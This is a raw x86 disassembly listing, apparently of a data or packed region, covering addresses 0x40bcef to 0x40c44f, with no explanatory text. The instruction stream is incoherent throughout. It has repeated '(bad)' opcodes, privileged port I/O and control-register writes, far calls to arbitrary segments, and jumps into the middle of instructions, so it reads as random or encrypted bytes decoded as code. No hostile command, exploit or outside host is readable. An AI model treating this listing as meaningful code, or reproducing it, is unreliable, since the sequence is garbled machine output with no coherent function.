  40bcef:	push   ebp
  40bcf0:	int3   
  40bcf1:	addr16 pushf 
  40bcf3:	sub    DWORD PTR [ebx+ebx*1+0x12],ecx
  40bcf7:	cdq    
  40bcf8:	mov    ds:0xa9c19bd0,al
  40bcfe:	push   ds
  40bcff:	cmp    al,0x6a
  40bd01:	xchg   esi,eax
  40bd02:	mov    ch,0x2a
  40bd04:	push   cs
  40bd05:	sahf   
  40bd06:	in     eax,dx
  40bd07:	loopne 0x40bcfc
  40bd09:	mov    BYTE PTR [edi],bh
  40bd0b:	loope  0x40bd88
  40bd0d:	push   esp
  40bd0e:	xchg   esp,eax
  40bd0f:	std    
  40bd10:	dec    ebx
  40bd11:	neg    DWORD PTR ds:0x3c82f07f
  40bd17:	(bad)  
  40bd19:	cs cld 
  40bd1b:	aas    
  40bd1c:	les    eax,FWORD PTR [ebx+0x47ba47b2]
  40bd22:	mov    ds:0xcf0dc6e1,eax
  40bd27:	pop    ds
  40bd28:	loop   0x40bd29
  40bd2a:	std    
  40bd2b:	pop    ebx
  40bd2c:	push   0xbc0dd778
  40bd31:	and    BYTE PTR [ecx+0x738a899d],dh
  40bd37:	popa   
  40bd38:	aam    0x93
  40bd3a:	pusha  
  40bd3b:	and    al,0xf4
  40bd3d:	adc    al,0x9a
  40bd3f:	pop    edx
  40bd40:	sahf   
  40bd41:	outs   dx,DWORD PTR ds:[esi]
  40bd42:	lock leave 
  40bd44:	mov    dh,0x34
  40bd46:	push   esi
  40bd47:	std    
  40bd48:	mov    BYTE PTR [edi+ebp*8],cl
  40bd4b:	dec    ebx
  40bd4c:	lods   al,BYTE PTR ds:[esi]
  40bd4d:	sbb    ecx,0x3
  40bd50:	add    DWORD PTR ds:0x58bb8d46,0x8aeec7c1
  40bd5a:	out    dx,al
  40bd5b:	rcl    BYTE PTR [edx+0x37f36831],1
  40bd61:	out    0x6a,al
  40bd63:	or     ecx,ebx
  40bd65:	ins    BYTE PTR es:[edi],dx
  40bd66:	and    al,0x4c
  40bd68:	clc    
  40bd69:	or     eax,0x843b9c0c
  40bd6e:	dec    eax
  40bd6f:	mov    dl,0xd5
  40bd71:	mov    ds:0x74fe58e0,eax
  40bd76:	sbb    al,0x74
  40bd78:	lods   eax,DWORD PTR ds:[esi]
  40bd79:	mov    cl,0xe2
  40bd7b:	jo     0x40bd55
  40bd7d:	pop    ebp
  40bd7e:	mov    ds:0x2d594723,al
  40bd83:	jg     0x40bd58
  40bd85:	and    DWORD PTR [edi+edx*8-0x7e0d8dff],0x46e8cb21
  40bd90:	push   esp
  40bd91:	push   ebx
  40bd92:	std    
  40bd93:	or     al,0x75
  40bd95:	sub    BYTE PTR [edi+0x16263873],al
  40bd9b:	add    BYTE PTR [edx+edi*2+0x67],dh
  40bd9f:	adc    ecx,ebx
  40bda1:	adc    eax,0xe34f28e7
  40bda6:	fdivr  DWORD PTR [esp+eax*8+0x56]
  40bdaa:	rol    DWORD PTR [edx],1
  40bdac:	jle    0x40bdc8
  40bdae:	jmp    0xda3bce44
  40bdb3:	mov    ds:0x2d677c8b,al
  40bdb8:	mov    al,gs:0x8d6b772b
  40bdbe:	retf   0x752e
  40bdc1:	in     eax,0x77
  40bdc3:	call   DWORD PTR ds:0xce5dc99d
  40bdc9:	dec    eax
  40bdca:	or     eax,DWORD PTR [edi]
  40bdcc:	push   0x3e
  40bdce:	mov    ds:0x30264680,eax
  40bdd3:	js     0x40bdb2
  40bdd5:	ja     0x40be02
  40bdd7:	xchg   esp,eax
  40bdd8:	ss sub al,0xf0
  40bddb:	mov    BYTE PTR [edi],dl
  40bddd:	jbe    0x40bdf0
  40bddf:	pop    eax
  40bde0:	push   edi
  40bde1:	(bad)  
  40bde2:	xchg   esp,eax
  40bde3:	in     eax,0xe5
  40bde5:	imul   esi,DWORD PTR [esi+0x70],0xf5fed23b
  40bdec:	outs   dx,BYTE PTR ds:[esi]
  40bded:	fcom   st(7)
  40bdef:	cmp    esi,DWORD PTR [ebp+0x3d]
  40bdf2:	sahf   
  40bdf3:	add    edx,0x92f80aa3
  40bdf9:	and    ecx,DWORD PTR [edi+esi*8-0x59]
  40bdfd:	ret    0xdd16
  40be00:	pop    ss
  40be01:	fwait
  40be02:	icebp  
  40be03:	mov    esi,0x1b6d9bd6
  40be08:	or     DWORD PTR [edi-0x8],ebx
  40be0b:	cs out dx,eax
  40be0d:	loope  0x40bde7
  40be0f:	push   cs
  40be10:	jg     0x40be27
  40be12:	push   cs
  40be13:	push   0x53
  40be15:	call   0x596b:0x33440cd6
  40be1c:	or     esi,0xffffffba
  40be1f:	ret    
  40be20:	addr16 jno 0x40be93
  40be23:	mov    ebp,0x889ed65d
  40be28:	xchg   edi,eax
  40be29:	adc    BYTE PTR [edx+0x44],dl
  40be2c:	xor    ah,BYTE PTR [edx]
  40be2e:	xchg   edi,eax
  40be2f:	xchg   ecx,ebp
  40be31:	addr16 xor al,0xc1
  40be34:	mov    bh,0x23
  40be36:	addr16 cmc 
  40be38:	jae    0x40be27
  40be3a:	mov    esp,0x5fb558c5
  40be3f:	popa   
  40be40:	(bad)  
  40be41:	icebp  
  40be42:	jns    0x40be27
  40be44:	and    eax,0xf63206ab
  40be49:	test   al,0xf
  40be4b:	sub    al,0x64
  40be4d:	aas    
  40be4e:	push   eax
  40be4f:	sub    edi,DWORD PTR [eax+0x56]
  40be52:	cmp    ecx,DWORD PTR [ebx+0x22]
  40be55:	in     eax,0x80
  40be57:	dec    esp
  40be58:	pop    esp
  40be59:	(bad)  
  40be5a:	ins    BYTE PTR es:[edi],dx
  40be5b:	sub    DWORD PTR [eax-0xb],ebp
  40be5e:	mov    ebp,0xc62738b8
  40be63:	push   0xb02bbcc1
  40be68:	js     0x40be4b
  40be6a:	lods   al,BYTE PTR ds:[esi]
  40be6b:	test   BYTE PTR [edi],dh
  40be6d:	push   esi
  40be6e:	mov    esi,0x8d6dc275
  40be73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be74:	xor    eax,DWORD PTR [eax+eiz*8]
  40be77:	fs jp  0x40be6d
  40be7a:	je     0x40be70
  40be7c:	xor    DWORD PTR [ebx+0x6f],0xff3a1d9b
  40be83:	pop    ds
  40be84:	neg    DWORD PTR [edi+0x5d]
  40be87:	adc    al,0xe4
  40be89:	mov    esi,DWORD PTR [eax+0x7a9c2d21]
  40be8f:	xor    cl,BYTE PTR [edx-0x206c3274]
  40be95:	or     edi,ebx
  40be97:	lock lods al,BYTE PTR fs:[esi]
  40be9a:	rcl    DWORD PTR [ecx+0x462d5cf2],0x3a
  40bea1:	and    DWORD PTR [eax-0x3f],edx
  40bea4:	xor    ch,BYTE PTR [esi-0x1f]
  40bea7:	and    BYTE PTR [eax+0x35f551c],bh
  40bead:	adc    DWORD PTR [ebp+0x2b16a5c3],edi
  40beb3:	xchg   edx,ecx
  40beb5:	mov    edi,DWORD PTR ds:0xe8b0b7b9
  40bebb:	push   0xaddaa153
  40bec0:	xor    al,0x35
  40bec2:	dec    ebx
  40bec3:	iret   
  40bec4:	jne    0x40bea0
  40bec6:	fadd   QWORD PTR [eax]
  40bec8:	sub    BYTE PTR [esi],bl
  40beca:	cli    
  40becb:	mov    ecx,0x6366c36b
  40bed0:	xor    ch,BYTE PTR [edx+0x31d17b22]
  40bed6:	(bad)  
  40bed7:	cmc    
  40bed8:	xchg   ecx,eax
  40bed9:	push   ebx
  40beda:	repz jmp 0x64de:0x117f7104
  40bee2:	leave  
  40bee3:	lock and BYTE PTR [ecx],ah
  40bee6:	dec    ebx
  40bee7:	and    al,0xe
  40bee9:	mov    ss,esi
  40beeb:	sub    ebp,DWORD PTR [eax+0x40]
  40beee:	and    eax,0x17a31dd
  40bef3:	xor    DWORD PTR [eax-0x7f],esp
  40bef6:	dec    ebp
  40bef7:	sub    ah,BYTE PTR [ecx+0x1b]
  40befa:	or     ah,dh
  40befc:	dec    eax
  40befd:	push   esi
  40befe:	sahf   
  40beff:	rcl    DWORD PTR [esp],0xfc
  40bf03:	imul   edi,DWORD PTR [edi+0x17],0x29ad16c6
  40bf0a:	sub    bh,BYTE PTR [esi]
  40bf0c:	sbb    bh,dl
  40bf0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf0f:	neg    BYTE PTR [esi-0x3a]
  40bf12:	iret   
  40bf13:	into   
  40bf14:	(bad)  
  40bf15:	mov    ebp,0x8614785b
  40bf1a:	xlat   BYTE PTR ds:[ebx]
  40bf1b:	xchg   ebp,eax
  40bf1c:	inc    edx
  40bf1d:	ins    BYTE PTR es:[edi],dx
  40bf1e:	jge    0x40bee8
  40bf20:	nop
  40bf21:	scas   eax,DWORD PTR es:[edi]
  40bf22:	xor    dh,cl
  40bf24:	push   0xb1cf9cf4
  40bf29:	xor    BYTE PTR [ecx],ah
  40bf2b:	cli    
  40bf2c:	xor    eax,0x2022d0d
  40bf31:	sub    ebx,DWORD PTR [ebx-0x4f]
  40bf34:	push   ss
  40bf35:	mov    bh,0xd6
  40bf37:	inc    edx
  40bf38:	mov    cr3,edx
  40bf3b:	dec    ebx
  40bf3c:	sbb    al,0x5a
  40bf3e:	and    al,0x7d
  40bf40:	push   0x5b
  40bf42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf43:	push   cs
  40bf44:	mov    cl,0x70
  40bf46:	imul   esp,edi,0xf3dac781
  40bf4c:	adc    ecx,DWORD PTR [esp+esi*1+0x2f]
  40bf50:	or     BYTE PTR [eax+0x5004feff],ch
  40bf56:	out    0x11,eax
  40bf58:	lock push cs
  40bf5a:	pop    edx
  40bf5b:	(bad)  
  40bf5c:	int    0x18
  40bf5e:	push   esp
  40bf5f:	fidivr DWORD PTR es:[edi+0x5cb931c9]
  40bf66:	mov    dh,BYTE PTR [ecx+0x31]
  40bf69:	ds pusha 
  40bf6b:	ins    BYTE PTR es:[edi],dx
  40bf6c:	push   ebp
  40bf6d:	xor    DWORD PTR [edx-0x315f876c],ecx
  40bf73:	mov    edi,ss
  40bf75:	(bad)  
  40bf76:	cmp    DWORD PTR [eax+eax*8-0x61fdcce4],ebx
  40bf7d:	mov    esi,0xc586742c
  40bf82:	mov    ebp,ss
  40bf84:	shl    DWORD PTR [eax],1
  40bf86:	xchg   esp,edi
  40bf88:	xchg   edi,eax
  40bf89:	out    0xf,eax
  40bf8b:	and    DWORD PTR [edx+0x6bd103c8],edx
  40bf91:	stos   DWORD PTR es:[edi],eax
  40bf92:	loopne 0x40bf23
  40bf94:	data16 fmul QWORD PTR [esi+esi*8+0x5]
  40bf99:	mov    BYTE PTR [edi+0x3f],cl
  40bf9c:	ror    DWORD PTR [ebx],cl
  40bf9e:	pop    ecx
  40bf9f:	fnstcw WORD PTR [ebp-0x7f]
  40bfa2:	lods   al,BYTE PTR ds:[esi]
  40bfa3:	call   0x7aae:0x6fc2ce7c
  40bfaa:	adc    eax,0xc814e62d
  40bfaf:	fst    QWORD PTR [edx+eax*1-0x43]
  40bfb3:	xchg   ecx,eax
  40bfb4:	into   
  40bfb5:	enter  0xe6be,0x43
  40bfb9:	or     ebp,DWORD PTR [eax]
  40bfbb:	or     ecx,ecx
  40bfbd:	adc    ah,ch
  40bfbf:	jp     0x40bf87
  40bfc1:	das    
  40bfc2:	repnz mov al,BYTE PTR cs:[ebx-0x42352192]
  40bfca:	jle    0x27fc3a6a
  40bfd0:	sub    eax,DWORD PTR [ebp-0x3edfe75b]
  40bfd6:	in     al,0x95
  40bfd8:	pop    ebp
  40bfd9:	mov    ds:0x8f696d,eax
  40bfde:	rol    BYTE PTR [ebx+0x69bb39bc],0xea
  40bfe5:	out    dx,eax
  40bfe6:	sub    bh,BYTE PTR [eax-0xfec80b]
  40bfec:	(bad)  
  40bfee:	rcr    BYTE PTR ds:[ecx+0x4918ac31],1
  40bff5:	loop   0x40bfc6
  40bff7:	and    BYTE PTR [edx],cl
  40bff9:	mov    ebx,0x7be6818e
  40bffe:	push   ecx
  40bfff:	dec    eax
  40c000:	push   eax
  40c001:	or     eax,0x6ef0c565
  40c006:	and    dl,BYTE PTR [esi-0x75fdb597]
  40c00c:	bound  esi,QWORD PTR [edx+0x7b]
  40c00f:	push   ecx
  40c010:	push   cs
  40c011:	mov    BYTE PTR [esi-0x76],cl
  40c014:	test   eax,0xb25136c5
  40c019:	sub    bl,al
  40c01b:	stos   BYTE PTR es:[edi],al
  40c01c:	loopne 0x40c048
  40c01e:	pop    esi
  40c01f:	fiadd  DWORD PTR ds:[edx+0x17]
  40c023:	inc    ebx
  40c024:	jns    0x40bfe7
  40c026:	cmp    eax,0xb73ddd3b
  40c02b:	xor    cl,BYTE PTR [edi+eiz*1+0x31809744]
  40c032:	xor    DWORD PTR [esi-0x30],esp
  40c035:	jmp    0x8893:0xfb59dacd
  40c03c:	cmp    esp,DWORD PTR [edx+0x2a243242]
  40c042:	pop    ss
  40c043:	lods   eax,DWORD PTR ds:[esi]
  40c044:	xor    al,0xb2
  40c046:	xchg   edx,eax
  40c047:	sbb    ebx,edx
  40c049:	fcomp  st(5)
  40c04b:	stc    
  40c04c:	mov    ds:0x1ef0f361,al
  40c051:	xchg   esp,ebp
  40c053:	mov    al,0xc4
  40c055:	xor    DWORD PTR [edx+0x3c],esp
  40c058:	leave  
  40c059:	pop    edi
  40c05a:	adc    edi,DWORD PTR [esi-0x41]
  40c05d:	inc    ebx
  40c05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05f:	sub    DWORD PTR [ecx+0x1f96862e],esi
  40c065:	add    ebp,DWORD PTR [ecx]
  40c067:	aam    0xe8
  40c069:	jno    0x40bff5
  40c06b:	sbb    BYTE PTR [edx],bh
  40c06d:	loopne 0x40c047
  40c06f:	or     DWORD PTR [edi],0x23f385da
  40c075:	dec    esi
  40c076:	sub    edx,DWORD PTR [ebx]
  40c078:	dec    ebx
  40c079:	sbb    ebx,ebx
  40c07b:	stos   DWORD PTR es:[edi],eax
  40c07c:	mov    edx,0x910cade
  40c081:	ss mov edi,0xb0f53d95
  40c087:	js     0x40c06e
  40c089:	jae    0x40c05f
  40c08b:	mov    ds:0x46290d62,eax
  40c090:	cmp    al,0x23
  40c092:	nop
  40c093:	dec    esi
  40c094:	and    BYTE PTR [esi+0x61],0x56
  40c098:	imul   edi,edx,0xf
  40c09b:	call   0x3ee7c692
  40c0a0:	ja     0x40c111
  40c0a2:	push   ds
  40c0a3:	sub    ah,BYTE PTR [ebx-0x13]
  40c0a6:	lahf   
  40c0a7:	jp     0x40c10b
  40c0a9:	jae    0x40c0e1
  40c0ab:	jl     0x40c0dc
  40c0ad:	sbb    BYTE PTR ds:0x5ff22b15,al
  40c0b3:	lds    ebp,FWORD PTR [eax+0x6b4694c5]
  40c0b9:	jo     0x40c056
  40c0bb:	add    al,0xee
  40c0bd:	dec    eax
  40c0be:	jecxz  0x40c0ef
  40c0c0:	test   BYTE PTR [ebx+0x1f],al
  40c0c3:	dec    esi
  40c0c4:	in     al,dx
  40c0c5:	ret    0xf541
  40c0c8:	mov    dh,BYTE PTR [ebx-0x4e]
  40c0cb:	jns    0x40c0e2
  40c0cd:	fld    QWORD PTR [ebp-0x1460c78f]
  40c0d3:	out    dx,al
  40c0d4:	dec    edx
  40c0d5:	sahf   
  40c0d6:	shr    BYTE PTR [edx+eax*1-0x1b],1
  40c0da:	rol    BYTE PTR [eax-0x28a1272],cl
  40c0e0:	mov    bh,0x7
  40c0e2:	sub    edi,DWORD PTR [edx]
  40c0e4:	fadd   QWORD PTR [ecx]
  40c0e6:	repz popa 
  40c0e8:	cwde   
  40c0e9:	push   edi
  40c0ea:	or     al,0x2a
  40c0ec:	xor    bh,BYTE PTR [eax+0xc]
  40c0ef:	std    
  40c0f0:	mov    bh,0x1a
  40c0f2:	jne    0x40c0e3
  40c0f4:	push   ebp
  40c0f5:	sbb    ch,dh
  40c0f7:	mov    ds:0x543d4e39,eax
  40c0fc:	add    edi,DWORD PTR [esp+eax*1+0xbf66794]
  40c103:	out    0x18,al
  40c105:	sbb    cl,0x3f
  40c108:	fsub   DWORD PTR [edx+0x3e]
  40c10b:	shl    esi,cl
  40c10d:	dec    edx
  40c10e:	pop    edi
  40c10f:	inc    edx
  40c110:	xchg   esp,eax
  40c111:	stos   BYTE PTR es:[edi],al
  40c112:	xor    BYTE PTR [ecx],bh
  40c114:	(bad)  
  40c115:	xor    ebx,esp
  40c117:	pop    edi
  40c118:	cmc    
  40c119:	adc    eax,DWORD PTR [ebx]
  40c11b:	pop    ss
  40c11c:	outs   dx,DWORD PTR ds:[esi]
  40c11d:	ret    
  40c11e:	inc    ecx
  40c11f:	or     eax,0x9f5ab8d9
  40c124:	cdq    
  40c125:	fcomp  QWORD PTR [esi+0x15b26322]
  40c12b:	push   ebx
  40c12d:	cmc    
  40c12e:	loopne 0x40c10c
  40c130:	pusha  
  40c131:	imul   edx,DWORD PTR [edi+0xb],0xa5e15bed
  40c138:	cli    
  40c139:	jge    0x40c0d3
  40c13b:	repz daa 
  40c13d:	setbe  BYTE PTR [edx-0x3f778615]
  40c144:	rcr    edi,cl
  40c146:	test   BYTE PTR [esi-0x64175d45],ch
  40c14c:	cmc    
  40c14d:	icebp  
  40c14e:	add    cl,BYTE PTR [ebp+0x4b]
  40c151:	inc    ebp
  40c152:	rcr    bh,cl
  40c154:	sbb    DWORD PTR [eax-0x7b],edi
  40c157:	mov    ecx,0x85f4d9c5
  40c15c:	push   es
  40c15d:	lods   al,BYTE PTR ds:[esi]
  40c15e:	sar    DWORD PTR [ebp-0x521d35e4],cl
  40c164:	dec    ebp
  40c165:	jecxz  0x40c165
  40c167:	fcom   DWORD PTR [ecx]
  40c169:	mov    ds:0x4c197e0e,al
  40c16e:	mov    ebx,0xb431c4bc
  40c173:	jecxz  0x40c19b
  40c175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c176:	test   eax,0xf6f4ff29
  40c17b:	stos   DWORD PTR es:[edi],eax
  40c17c:	sbb    al,BYTE PTR [edx+edx*4-0x58019f9]
  40c183:	fiadd  WORD PTR [edx-0x74]
  40c186:	call   0xfd240f55
  40c18b:	xor    ebp,DWORD PTR [ecx-0x17be6f22]
  40c191:	rsqrtps xmm7,XMMWORD PTR [edx-0xb597d4a]
  40c198:	mov    ebp,0x72b36813
  40c19d:	sub    BYTE PTR [edx+0x775f8d32],al
  40c1a3:	ret    0x739a
  40c1a6:	pop    es
  40c1a7:	loope  0x40c1b1
  40c1a9:	fisttp QWORD PTR [ebx]
  40c1ab:	popa   
  40c1ac:	xchg   edx,eax
  40c1ad:	mov    bl,0xf9
  40c1af:	pusha  
  40c1b0:	enter  0x3160,0x68
  40c1b4:	adc    DWORD PTR [esi-0x42bd2fdf],0x69
  40c1bb:	xlat   BYTE PTR ds:[ebx]
  40c1bc:	sub    bl,ah
  40c1be:	out    0xb3,al
  40c1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c1:	test   edi,edx
  40c1c3:	sbb    edx,DWORD PTR [eax]
  40c1c5:	dec    esi
  40c1c6:	dec    edx
  40c1c7:	(bad)  
  40c1c8:	fdivr  QWORD PTR [edi]
  40c1ca:	xlat   BYTE PTR ds:[ebx]
  40c1cb:	cmc    
  40c1cc:	mov    cl,0x24
  40c1ce:	xor    eax,0x9a3cff53
  40c1d3:	and    al,0xa5
  40c1d5:	and    dh,dh
  40c1d7:	enter  0x61a5,0x59
  40c1db:	push   esp
  40c1dc:	push   edi
  40c1dd:	lds    edx,FWORD PTR [edi+0x7242f425]
  40c1e3:	fild   DWORD PTR [eax]
  40c1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e6:	icebp  
  40c1e7:	rcl    DWORD PTR [ebx-0x62],0xc7
  40c1eb:	mov    esi,0xf5f8b1f0
  40c1f0:	jle    0x40c1a8
  40c1f2:	cmp    ah,0xed
  40c1f5:	scas   eax,DWORD PTR es:[edi]
  40c1f6:	test   BYTE PTR [edx+0x4],ch
  40c1f9:	sbb    esi,DWORD PTR [ecx+0x30]
  40c1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fd:	das    
  40c1fe:	sub    esi,0x34
  40c201:	les    edi,FWORD PTR [esi]
  40c203:	xchg   edi,eax
  40c204:	pop    edi
  40c205:	xchg   ebp,eax
  40c206:	pushf  
  40c207:	nop
  40c208:	je     0x40c18f
  40c20a:	pop    edx
  40c20b:	in     eax,0xc7
  40c20d:	pop    edi
  40c20e:	mov    ah,BYTE PTR [edi]
  40c210:	retf   0x9fa9
  40c213:	or     ch,BYTE PTR [ebp-0x6cafb8f0]
  40c219:	(bad)  
  40c21a:	sbb    eax,edx
  40c21c:	ret    0x8631
  40c21f:	xlat   BYTE PTR ds:[ebx]
  40c220:	sub    esi,DWORD PTR [eax+0x6b]
  40c223:	inc    edi
  40c224:	out    dx,al
  40c225:	lahf   
  40c226:	and    dl,BYTE PTR [ecx+0x44]
  40c229:	adc    ah,BYTE PTR [ecx+0x2d]
  40c22c:	in     al,0x2d
  40c22e:	jne    0x40c23c
  40c230:	ja     0x40c1fc
  40c232:	popf   
  40c233:	push   0xcd0ef56f
  40c238:	jbe    0x40c1ce
  40c23a:	push   esi
  40c23b:	imul   DWORD PTR [esi+0x2b5aeb5b]
  40c241:	in     al,0xd7
  40c243:	idiv   BYTE PTR [eax-0x15]
  40c246:	add    bl,dh
  40c248:	adc    eax,0xd10a1c5d
  40c24d:	push   edx
  40c24e:	jg     0x40c249
  40c250:	sar    dl,cl
  40c252:	xchg   ebp,eax
  40c253:	xor    esp,DWORD PTR [edx+0xf]
  40c256:	add    DWORD PTR [ecx+edi*8-0x9],0x40
  40c25b:	push   edx
  40c25c:	enter  0xb41a,0x11
  40c260:	cdq    
  40c261:	mov    ds:0x3c0b3892,eax
  40c266:	rcr    BYTE PTR [esi-0x23],1
  40c269:	stos   BYTE PTR es:[edi],al
  40c26a:	xlat   BYTE PTR ds:[ebx]
  40c26b:	aam    0xc7
  40c26d:	fistp  QWORD PTR [edx+esi*4+0x35]
  40c271:	mov    ecx,DWORD PTR [ebx*8+0x2a91c32d]
  40c278:	mov    ds:0xbacec5e1,eax
  40c27d:	inc    edx
  40c27e:	cmp    al,0x6e
  40c280:	push   esi
  40c281:	mov    dl,0xd6
  40c283:	icebp  
  40c284:	mov    ch,BYTE PTR [esi+0x390478f5]
  40c28a:	adc    al,0x73
  40c28c:	outs   dx,BYTE PTR ds:[esi]
  40c28d:	loope  0x40c2c4
  40c28f:	(bad)  
  40c290:	and    eax,0xf3736659
  40c295:	mov    al,ds:0x14bc5049
  40c29a:	fst    DWORD PTR [ebx]
  40c29c:	lahf   
  40c29d:	scas   al,BYTE PTR es:[edi]
  40c29e:	mov    dl,dl
  40c2a0:	ret    
  40c2a1:	imul   esp,DWORD PTR [ecx],0x3baf6f71
  40c2a7:	pop    esp
  40c2a8:	adc    DWORD PTR [esi],ebp
  40c2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ab:	int3   
  40c2ac:	jmp    0x40c2c0
  40c2ae:	inc    eax
  40c2af:	add    BYTE PTR [ebp-0x4a],dh
  40c2b2:	jge    0x40c267
  40c2b4:	cmp    ah,dh
  40c2b6:	inc    ebx
  40c2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2b8:	repz scas al,BYTE PTR es:[edi]
  40c2ba:	dec    edx
  40c2bb:	lahf   
  40c2bc:	pop    edx
  40c2bd:	pop    ds
  40c2be:	(bad)  
  40c2bf:	pop    esp
  40c2c0:	setb   BYTE PTR [ecx+0x5a]
  40c2c4:	xchg   esp,eax
  40c2c5:	mov    bh,BYTE PTR [edi-0x78]
  40c2c8:	sbb    BYTE PTR [edi],0xde
  40c2cb:	mov    esi,0xc5290fc8
  40c2d0:	fldl2t 
  40c2d2:	fcomp  DWORD PTR [eax+0x40]
  40c2d5:	mov    edi,0xfcd7ce5
  40c2da:	dec    ecx
  40c2db:	pop    edi
  40c2dc:	fisub  WORD PTR [edi+0x3e]
  40c2df:	loop   0x40c2a3
  40c2e1:	(bad)  
  40c2e2:	call   0x56fe4ef3
  40c2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2e8:	icebp  
  40c2e9:	js     0x40c2c2
  40c2eb:	and    ah,BYTE PTR [edx+0x4ba85f48]
  40c2f1:	shr    DWORD PTR [edi+0x46cef87b],cl
  40c2f7:	shl    BYTE PTR [edi],1
  40c2f9:	jecxz  0x40c2c7
  40c2fb:	push   edx
  40c2fc:	test   BYTE PTR [ebp+ebx*2-0x6a],dl
  40c300:	add    edi,DWORD PTR [esi-0x34]
  40c303:	mov    bl,BYTE PTR [edi]
  40c305:	or     BYTE PTR [edi+0x4d],bl
  40c308:	out    dx,al
  40c309:	add    eax,0xeb56f556
  40c30e:	daa    
  40c30f:	cli    
  40c310:	pusha  
  40c311:	fst    DWORD PTR [eax]
  40c313:	scas   eax,DWORD PTR es:[edi]
  40c314:	pop    edi
  40c315:	pop    ds
  40c316:	adc    dl,BYTE PTR [esi]
  40c318:	sbb    BYTE PTR [ebp+ecx*4-0x29],bh
  40c31c:	mov    cl,0x98
  40c31e:	sub    eax,DWORD PTR [eax-0x2e38a5d8]
  40c324:	mov    dh,0x6e
  40c326:	js     0x40c2fb
  40c328:	sub    DWORD PTR [ebx],ebp
  40c32a:	(bad)  
  40c32b:	cmp    bl,BYTE PTR [ebx+0x3d169a9e]
  40c331:	int3   
  40c332:	lds    ebp,FWORD PTR [edi-0x3b01bbd6]
  40c338:	mov    ch,0x3d
  40c33a:	(bad)  
  40c33b:	ds mov ah,0x2
  40c33e:	js     0x40c2d8
  40c340:	fwait
  40c341:	lahf   
  40c342:	out    0x28,eax
  40c344:	cmp    eax,0xd796175c
  40c349:	jle    0x40c2f6
  40c34b:	ins    DWORD PTR es:[edi],dx
  40c34c:	pop    ss
  40c34d:	cmp    eax,0xcbd67751
  40c352:	cld    
  40c353:	lahf   
  40c354:	push   ebp
  40c355:	inc    edi
  40c356:	std    
  40c357:	lods   al,BYTE PTR ds:[esi]
  40c358:	pop    ebx
  40c359:	or     edx,DWORD PTR [ebx+0x7e2883f]
  40c35f:	jl     0x40c32f
  40c361:	scas   eax,DWORD PTR es:[edi]
  40c362:	sbb    eax,0x2a9188f5
  40c367:	mov    cl,0x3a
  40c369:	(bad)  
  40c36a:	mov    esi,0x9d143447
  40c36f:	sub    DWORD PTR [edx+eax*4+0x175587d1],esp
  40c376:	pusha  
  40c377:	and    BYTE PTR [edx],cl
  40c379:	jns    0x40c361
  40c37b:	or     DWORD PTR [edi+edx*4-0x4c8fcf2],edi
  40c382:	and    eax,0x25ad6020
  40c387:	fcomp  st(3)
  40c389:	jno    0x40c3d8
  40c38b:	xchg   ecx,eax
  40c38c:	dec    edx
  40c38d:	push   ebp
  40c38e:	push   edi
  40c38f:	mov    ds:0xd7edd57c,eax
  40c394:	and    DWORD PTR [edx+0x45],0x5c78168d
  40c39b:	pushf  
  40c39c:	and    BYTE PTR [ebx],bl
  40c39e:	scas   al,BYTE PTR es:[edi]
  40c39f:	push   esp
  40c3a0:	inc    edx
  40c3a1:	xchg   esp,eax
  40c3a2:	or     al,0xf3
  40c3a4:	ror    DWORD PTR [eax],cl
  40c3a6:	adc    esp,DWORD PTR [ebp+0x39]
  40c3a9:	ins    BYTE PTR es:[edi],dx
  40c3aa:	jno    0x40c3f7
  40c3ac:	push   0xb83c3889
  40c3b1:	sbb    ebp,edx
  40c3b3:	or     eax,0xda6c4e1c
  40c3b8:	mov    ds:0x6acdff72,al
  40c3bd:	pushf  
  40c3be:	into   
  40c3bf:	int    0x83
  40c3c1:	sbb    eax,ebp
  40c3c3:	mov    DWORD PTR ds:0xd5337324,edi
  40c3c9:	inc    eax
  40c3ca:	leave  
  40c3cb:	loope  0x40c363
  40c3cd:	pop    ss
  40c3ce:	push   DWORD PTR [esp+ebx*4-0x63]
  40c3d2:	imul   ebp,DWORD PTR [edi+0x76922b82],0xffffffc0
  40c3d9:	add    ecx,DWORD PTR [edi+esi*1+0x6]
  40c3dd:	and    eax,0xadf94129
  40c3e2:	adc    BYTE PTR fs:[edi],0x1
  40c3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3e7:	mov    al,0xc1
  40c3e9:	in     eax,0xbc
  40c3eb:	test   DWORD PTR [ebx],edx
  40c3ed:	xchg   ebx,eax
  40c3ee:	or     al,0xf
  40c3f0:	test   edi,edi
  40c3f2:	add    al,BYTE PTR [ebx+0xb]
  40c3f5:	mov    dh,0xfa
  40c3f7:	not    BYTE PTR [edx]
  40c3f9:	mov    ecx,0xe20c90c1
  40c3fe:	cmp    esp,DWORD PTR [ecx+0x3e4419b]
  40c404:	xchg   ebp,eax
  40c405:	adc    cl,BYTE PTR [ebx-0x54ac54df]
  40c40b:	call   0x43e:0x57471727
  40c412:	sub    DWORD PTR gs:[ecx],0x54
  40c416:	lods   al,BYTE PTR ds:[esi]
  40c417:	(bad)  
  40c418:	sub    eax,0xc08b53e5
  40c41d:	or     BYTE PTR [edx+edi*4],ch
  40c420:	push   esi
  40c421:	in     eax,dx
  40c422:	pop    ebp
  40c423:	inc    ebp
  40c424:	ret    0xd01
  40c427:	cld    
  40c428:	sub    esp,DWORD PTR ds:0xd5d61758
  40c42e:	lock dec ebx
  40c430:	je     0x7f06082f
  40c436:	test   ah,al
  40c438:	sti    
  40c439:	call   0x72c4:0x202a0bc5
  40c440:	jmp    0x40c42d
  40c442:	rol    BYTE PTR [edx+0x26],0x95
  40c446:	xor    edx,DWORD PTR [esi-0x62]
  40c449:	jno    0x40c481
  40c44b:	mov    al,0x6d
  40c44d:	mov    ch,0x4f
  40c44f:	nop
